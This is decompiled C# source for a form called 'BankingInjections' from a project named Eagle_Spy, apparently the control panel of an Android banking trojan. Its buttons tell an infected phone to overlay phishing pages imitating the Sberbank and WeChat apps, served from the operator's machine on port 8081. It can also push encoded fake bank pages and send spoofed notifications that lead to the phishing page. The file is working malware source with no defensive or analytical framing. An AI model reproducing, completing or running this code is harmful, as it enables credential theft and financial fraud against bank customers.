using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Windows.Forms;
using DrakeUI.Framework;
using Eagle_Spy;
using Eagle_Spy.sockets;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic.CompilerServices;

namespace Eaglespy
{
	// Token: 0x020000EB RID: 235
	public partial class BankingInjections : Form
	{
		// Token: 0x06000B98 RID: 2968 RVA: 0x00007532 File Offset: 0x00005732
		public BankingInjections()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000B99 RID: 2969 RVA: 0x000FD4D8 File Offset: 0x000FB6D8
		private void drakeUIButtonIcon98_Click(object sender, EventArgs e)
		{
			string text = "wechat>http://" + this.ip.Text + ":8081/crypto/wechat.html>com.tencent.mm>";
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.classClient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"lodp<*>ad<*>",
							text,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000B9A RID: 2970 RVA: 0x000FD62C File Offset: 0x000FB82C
		private void drakeUIButtonIcon3_Click(object sender, EventArgs e)
		{
			string text = "sber>http://" + this.ip.Text + ":8081/bank/sberbank/index.html>ru.sberbankmobile>";
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.classClient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"lodp<*>ad<*>",
							text,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000B9B RID: 2971 RVA: 0x000FD780 File Offset: 0x000FB980
		private void drakeUIButtonIcon97_Click(object sender, EventArgs e)
		{
			try
			{
				string text = "C:\\Programs\\Files\\bank\\wechat.html";
				TcpClient myClient = this.classClient.myClient;
				string[] array = this.classClient.Keys.Split(new char[] { ':' });
				string text2 = Conversions.ToString(Codes.BSEN(File.ReadAllText(text)));
				object[] array2 = new object[]
				{
					myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"ussd<*>",
						text2,
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(array2);
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000B9C RID: 2972 RVA: 0x000FD8CC File Offset: 0x000FBACC
		private void drakeUIButtonIcon2_Click(object sender, EventArgs e)
		{
			try
			{
				string text = "C:\\Programs\\Files\\bank\\sberbank\\index.html";
				TcpClient myClient = this.classClient.myClient;
				string[] array = this.classClient.Keys.Split(new char[] { ':' });
				string text2 = Conversions.ToString(Codes.BSEN(File.ReadAllText(text)));
				object[] array2 = new object[]
				{
					myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"ussd<*>",
						text2,
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(array2);
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000B9D RID: 2973 RVA: 0x000FDA18 File Offset: 0x000FBC18
		private void drakeUIButtonIcon96_Click(object sender, EventArgs e)
		{
			using (Dialogue3 dialogue = new Dialogue3())
			{
				DialogResult dialogResult = dialogue.ShowDialog();
				if (dialogResult == DialogResult.OK)
				{
					string bodyText = dialogue.BodyText;
					string messageText = dialogue.MessageText;
					string text = "http://" + this.ip.Text + ":8081/bank/sberbank/index.html";
					string text2 = string.Concat(new string[] { bodyText, ">", messageText, ">2>", text, ">0>" });
					if (this.classClient != null)
					{
						try
						{
							string[] array = this.classClient.Keys.Split(new char[] { ':' });
							object[] array2 = new object[]
							{
								this.classClient.myClient,
								string.Concat(new string[]
								{
									SecurityKey.KeysClient2,
									Data.SPL_SOCKET,
									"noti<*>",
									text2,
									Data.SPL_SOCKET,
									array[0],
									Data.SPL_SOCKET,
									array[1],
									Data.SPL_SOCKET,
									SecurityKey.Lockscreen,
									Data.SPL_SOCKET,
									Conversions.ToString(0),
									Data.SPL_SOCKET,
									Conversions.ToString(0),
									Data.SPL_SOCKET,
									Data.SPL_ARRAY,
									Data.SPL_SOCKET,
									this.classClient.ClientRemoteAddress
								}),
								Codes.Encoding().GetBytes("null"),
								this.classClient
							};
							this.classClient.SendMessage(array2);
						}
						catch (Exception)
						{
						}
					}
				}
			}
		}

		// Token: 0x06000B9E RID: 2974 RVA: 0x000FDA18 File Offset: 0x000FBC18
		private void drakeUIButtonIcon1_Click(object sender, EventArgs e)
		{
			using (Dialogue3 dialogue = new Dialogue3())
			{
				DialogResult dialogResult = dialogue.ShowDialog();
				if (dialogResult == DialogResult.OK)
				{
					string bodyText = dialogue.BodyText;
					string messageText = dialogue.MessageText;
					string text = "http://" + this.ip.Text + ":8081/bank/sberbank/index.html";
					string text2 = string.Concat(new string[] { bodyText, ">", messageText, ">2>", text, ">0>" });
					if (this.classClient != null)
					{
						try
						{
							string[] array = this.classClient.Keys.Split(new char[] { ':' });
							object[] array2 = new object[]
							{
								this.classClient.myClient,
								string.Concat(new string[]
								{
									SecurityKey.KeysClient2,
									Data.SPL_SOCKET,
									"noti<*>",
									text2,
									Data.SPL_SOCKET,
									array[0],
									Data.SPL_SOCKET,
									array[1],
									Data.SPL_SOCKET,
									SecurityKey.Lockscreen,
									Data.SPL_SOCKET,
									Conversions.ToString(0),
									Data.SPL_SOCKET,
									Conversions.ToString(0),
									Data.SPL_SOCKET,
									Data.SPL_ARRAY,
									Data.SPL_SOCKET,
									this.classClient.ClientRemoteAddress
								}),
								Codes.Encoding().GetBytes("null"),
								this.classClient
							};
							this.classClient.SendMessage(array2);
						}
						catch (Exception)
						{
						}
					}
				}
			}
		}

		// Token: 0x06000B9F RID: 2975 RVA: 0x000FDBF0 File Offset: 0x000FBDF0
		public void DisplayIPv4Address()
		{
			try
			{
				IPHostEntry hostEntry = Dns.GetHostEntry(Dns.GetHostName());
				string text = null;
				IPAddress[] addressList = hostEntry.AddressList;
				foreach (IPAddress ipaddress in addressList)
				{
					if (ipaddress.AddressFamily == AddressFamily.InterNetwork)
					{
						text = ipaddress.ToString();
						break;
					}
				}
				if (text != null)
				{
					this.ip.Text = text ?? "";
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000BA0 RID: 2976 RVA: 0x000FDC6C File Offset: 0x000FBE6C
		private void drakeUIAvatar1_Click(object sender, EventArgs e)
		{
			string text = "sber";
			string[] array = this.classClient.Keys.Split(new char[] { ':' });
			object[] array2 = new object[]
			{
				this.classClient.myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"lodp<*>re<*>",
					text,
					Data.SPL_SOCKET,
					array[0],
					Data.SPL_SOCKET,
					array[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.classClient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(array2);
		}

		// Token: 0x06000BA1 RID: 2977 RVA: 0x000FDD80 File Offset: 0x000FBF80
		private void drakeUIAvatar16_Click(object sender, EventArgs e)
		{
			string text = "wechat";
			string[] array = this.classClient.Keys.Split(new char[] { ':' });
			object[] array2 = new object[]
			{
				this.classClient.myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"lodp<*>re<*>",
					text,
					Data.SPL_SOCKET,
					array[0],
					Data.SPL_SOCKET,
					array[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.classClient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(array2);
		}

		// Token: 0x06000BA2 RID: 2978 RVA: 0x00007540 File Offset: 0x00005740
		private void BankingInjections_Load(object sender, EventArgs e)
		{
			this.UpdateLanguage();
			this.DisplayIPv4Address();
		}

		// Token: 0x06000BA3 RID: 2979 RVA: 0x000FDE94 File Offset: 0x000FC094
		private void UpdateEnglish()
		{
			this.label8.Text = "Banking Injection";
			this.drakeUIButtonIcon98.Text = "Inject";
			this.drakeUIButtonIcon97.Text = "Show";
			this.drakeUIButtonIcon96.Text = "Push";
			this.drakeUIButtonIcon3.Text = "Inject";
			this.drakeUIButtonIcon2.Text = "Show";
			this.drakeUIButtonIcon1.Text = "Push";
		}

		// Token: 0x06000BA4 RID: 2980 RVA: 0x000FDF14 File Offset: 0x000FC114
		private void UpdateChinese()
		{
			this.label8.Text = "银行注入";
			this.drakeUIButtonIcon98.Text = "注入";
			this.drakeUIButtonIcon97.Text = "显示";
			this.drakeUIButtonIcon96.Text = "推送";
			this.drakeUIButtonIcon3.Text = "注入";
			this.drakeUIButtonIcon2.Text = "显示";
			this.drakeUIButtonIcon1.Text = "推送";
		}

		// Token: 0x06000BA5 RID: 2981 RVA: 0x000FDF94 File Offset: 0x000FC194
		private void UpdateRussian()
		{
			this.label8.Text = "Банковская Инъекция";
			this.drakeUIButtonIcon98.Text = "Инъекция";
			this.drakeUIButtonIcon97.Text = "Показать";
			this.drakeUIButtonIcon96.Text = "Отправить";
			this.drakeUIButtonIcon3.Text = "Инъекция";
			this.drakeUIButtonIcon2.Text = "Показать";
			this.drakeUIButtonIcon1.Text = "Отправить";
		}

		// Token: 0x06000BA6 RID: 2982 RVA: 0x000FE014 File Offset: 0x000FC214
		private void UpdateLanguage()
		{
			string text = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "res", "Config", "Language.inf");
			if (File.Exists(text))
			{
				string text2 = File.ReadAllText(text);
				if (text2.Contains("English"))
				{
					this.UpdateEnglish();
					return;
				}
				if (text2.Contains("Russian"))
				{
					this.UpdateRussian();
					return;
				}
				if (text2.Contains("Chinese"))
				{
					this.UpdateChinese();
					return;
				}
				this.UpdateEnglish();
			}
		}

		// Token: 0x04000EE3 RID: 3811
		public TcpClient Client;

		// Token: 0x04000EE4 RID: 3812
		public Client classClient;

		// Token: 0x04000EE5 RID: 3813
		public string DownloadsFolder;

		// Token: 0x04000EE6 RID: 3814
		public string Title;

		// Token: 0x04000EE7 RID: 3815
		public Dictionary<string, string> MapData;
	}
}
